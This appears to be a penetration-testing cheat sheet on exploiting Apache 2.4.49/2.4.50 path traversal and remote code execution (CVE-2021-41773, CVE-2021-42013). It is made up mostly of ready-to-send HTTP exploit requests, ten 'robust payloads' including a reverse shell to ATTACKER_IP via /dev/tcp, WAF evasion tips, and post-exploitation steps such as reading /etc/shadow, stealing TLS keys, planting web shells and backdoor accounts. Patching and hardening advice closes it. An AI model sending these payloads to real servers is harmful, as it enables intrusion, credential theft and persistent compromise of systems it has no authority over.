## 1. Overview

Apache HTTP Server is one of the most widely used web servers globally. When encountering Apache in the wild, understanding its vulnerability landscape is crucial for security assessment.

**Detection Methods:**

- Check HTTP response headers for `Server: Apache` or `Server: Apache/2.4.50`
- Examine 404 error pages (often display version information)
- Version information helps identify applicable CVEs

**Key Resource:** [Apache HTTP Server CVE Database](https://www.cvedetails.com/vulnerability-list/vendor_id-45/product_id-66/Apache-Http-Server.html)

---

## 2. Exploitation Methods

### Version Discovery

**Step 1: Identify Apache Version**

- Inspect HTTP response headers
- Trigger 404 pages to reveal version strings
- Use automated scanners for fingerprinting

**Step 2: CVE Mapping**

- Cross-reference discovered version with CVE database
- Prioritize critical vulnerabilities (RCE, LFI, authentication bypass)
- Verify vulnerable configurations are present

### CVE-2021-41773 (Path Traversal & RCE)

**Affected Versions:** Apache 2.4.49

**Vulnerability Type:** Directory traversal leading to Remote Code Execution

**Exploitation Steps:**

1. **Test for Path Traversal:**

```http
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: target.com
```

2. **Execute Remote Commands:**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: */*
Content-Length: 7
Content-Type: application/x-www-form-urlencoded
Connection: close

echo;id
```

**Requirements:**

- `mod_cgi` enabled
- Specific path traversal sequences (`.%2e`)

### CVE-2021-42013 (Path Traversal & RCE Bypass)

**Affected Versions:** Apache 2.4.49, 2.4.50

**Vulnerability Type:** Bypass of CVE-2021-41773 patch

**Exploitation Steps:**

1. **Double URL Encoding Attack:**

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;id
```

**Key Technique:** Double URL encoding (`%%32%65` = `.`) bypasses initial patch

---

## 3. Bypasses

### Path Traversal Encoding Variations

**Single Encoding Bypass:**

```
/.%2e/.%2e/.%2e/
```

**Double Encoding Bypass (CVE-2021-42013):**

```
/%%32%65%%32%65/%%32%65%%32%65/
```

**Mixed Encoding Attempts:**

```
/.%%32%65/.%%32%65/
/%2e%2e/%2e%2e/
```

### WAF Evasion Techniques

- Use alternative path separators
- Inject null bytes (context-dependent)
- Leverage case sensitivity differences
- Fragment requests across multiple packets

---

## 4. Payloads

### Top 10 Modern & Robust Payloads

**1. Basic RCE Test (CVE-2021-41773)**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;id
```

**2. Double Encoded RCE (CVE-2021-42013)**

```http
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;id
```

**3. File Read - /etc/passwd**

```http
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd HTTP/1.1
Host: target.com
```

**4. File Read - Double Encoded**

```http
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd HTTP/1.1
Host: target.com
```

**5. Command Execution with Output**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

echo;whoami;pwd
```

**6. Reverse Shell Attempt**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

echo;bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**7. Environment Variable Disclosure**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

echo;env
```

**8. System Information Gathering**

```http
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

echo;uname -a
```

**9. Web Root Discovery**

```http
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/var/www/html/index.html HTTP/1.1
Host: target.com
```

**10. Configuration File Access**

```http
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/apache2/apache2.conf HTTP/1.1
Host: target.com
```

---

## 5. Higher Impact Scenarios

### Privilege Escalation Chain

**Step 1:** Gain initial code execution via path traversal **Step 2:** Read `/etc/passwd` and `/etc/shadow` for credential extraction **Step 3:** Identify SUID binaries or misconfigured services **Step 4:** Escalate to root privileges

### Lateral Movement

- Access configuration files to discover database credentials
- Read application source code for hardcoded secrets
- Enumerate internal network from compromised web server
- Pivot to backend systems using discovered credentials

### Data Exfiltration

- Access sensitive application data
- Download database backups
- Extract customer information
- Steal SSL/TLS private keys from server

### Persistent Access

- Deploy web shells in writable directories
- Modify startup scripts for persistence
- Create backdoor user accounts
- Install rootkits for long-term access

---

## 6. Mitigations

### Immediate Actions

**Patch Management:**

- Update to Apache 2.4.51 or later (addresses CVE-2021-41773 & CVE-2021-42013)
- Subscribe to Apache security mailing lists
- Implement automated patch deployment

**Configuration Hardening:**

- Disable `mod_cgi` if not required
- Restrict CGI script execution directories
- Implement strict directory access controls

### Defense in Depth

**Network Level:**

- Deploy Web Application Firewalls (WAF)
- Implement intrusion detection systems
- Use allowlisting for legitimate request patterns

**Application Level:**

- Validate and sanitize all input
- Implement proper error handling (disable verbose errors)
- Remove version disclosure from headers and error pages

**Monitoring & Detection:**

- Log all path traversal attempts
- Alert on suspicious encoding patterns
- Monitor for abnormal CGI-bin access
- Track command execution patterns

### Long-Term Security Posture

- Regular vulnerability assessments
- Penetration testing for Apache-specific issues
- Security awareness training for operations teams
- Incident response plan for RCE scenarios

---

## 🎯 Quick Action Checklist

- [ ] Identify Apache version on target
- [ ] Check CVE database for applicable vulnerabilities
- [ ] Test for path traversal with encoded sequences
- [ ] Attempt RCE via CGI-bin if accessible
- [ ] Document all findings with proof-of-concept
- [ ] Recommend immediate patching to Apache 2.4.51+

**Pro Tip:** Always test in authorized environments only. Document your methodology for reproducibility! 🚀